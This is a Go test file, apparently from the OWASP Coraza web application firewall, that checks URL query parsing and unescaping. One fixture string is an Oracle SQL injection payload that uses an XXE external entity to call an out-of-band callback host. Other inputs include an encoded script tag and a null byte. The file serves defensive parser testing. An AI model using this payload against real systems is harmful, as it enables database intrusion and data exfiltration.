// Copyright 2022 Juan Pablo Tosso and the OWASP Coraza contributors
// SPDX-License-Identifier: Apache-2.0

package url

import (
	"testing"
)

var parseQueryInput = `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`

func TestUrlPayloads(t *testing.T) {
	q := ParseQuery(parseQueryInput, '&')
	if len(q["var"]) == 0 {
		t.Error("var is empty")
	}
}

func BenchmarkParseQuery(b *testing.B) {
	for i := 0; i < b.N; i++ {
		ParseQuery(parseQueryInput, '&')
	}
}

var queryUnescapePayloads = map[string]string{
	"sample":    "sample",
	"s%20ample": "s ample",
	"s+ample":   "s ample",
	"s%2fample": "s/ample",
	"s% ample":  "s% ample",  // non-strict sample
	"s%ssample": "s%ssample", // non-strict sample
	"s%00ample": "s\x00ample",
	"%7B%%7d":   "{%}",
	"%7B+%+%7d": "{ % }",
}

func TestQueryUnescape(t *testing.T) {
	for k, v := range queryUnescapePayloads {
		if out := queryUnescape(k); out != v {
			t.Errorf("Error parsing %q, got %q and expected %q", k, out, v)
		}
	}
}

func BenchmarkQueryUnescape(b *testing.B) {
	for i := 0; i < b.N; i++ {
		for k := range queryUnescapePayloads {
			queryUnescape(k)
		}
	}
}

func TestParseQueryRaw(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  map[string][]string
	}{
		{
			name:  "preserves percent-encoded values",
			input: "key=%3Cscript%3E&other=hello",
			want: map[string][]string{
				"key":   {"%3Cscript%3E"},
				"other": {"hello"},
			},
		},
		{
			name:  "preserves double encoding",
			input: "password=Secret%2500",
			want: map[string][]string{
				"password": {"Secret%2500"},
			},
		},
		{
			name:  "preserves plus signs",
			input: "q=hello+world",
			want: map[string][]string{
				"q": {"hello+world"},
			},
		},
		{
			name:  "preserves encoded key names",
			input: "p%61ssword=test",
			want: map[string][]string{
				"p%61ssword": {"test"},
			},
		},
		{
			name:  "empty value",
			input: "key=",
			want: map[string][]string{
				"key": {""},
			},
		},
		{
			name:  "no value (no equals)",
			input: "key",
			want: map[string][]string{
				"key": {""},
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ParseQueryRaw(tt.input, '&')
			for k, wantVals := range tt.want {
				gotVals, ok := got[k]
				if !ok {
					t.Errorf("missing key %q", k)
					continue
				}
				if len(gotVals) != len(wantVals) {
					t.Errorf("key %q: got %d values, want %d", k, len(gotVals), len(wantVals))
					continue
				}
				for i, wv := range wantVals {
					if gotVals[i] != wv {
						t.Errorf("key %q[%d]: got %q, want %q", k, i, gotVals[i], wv)
					}
				}
			}
		})
	}
}
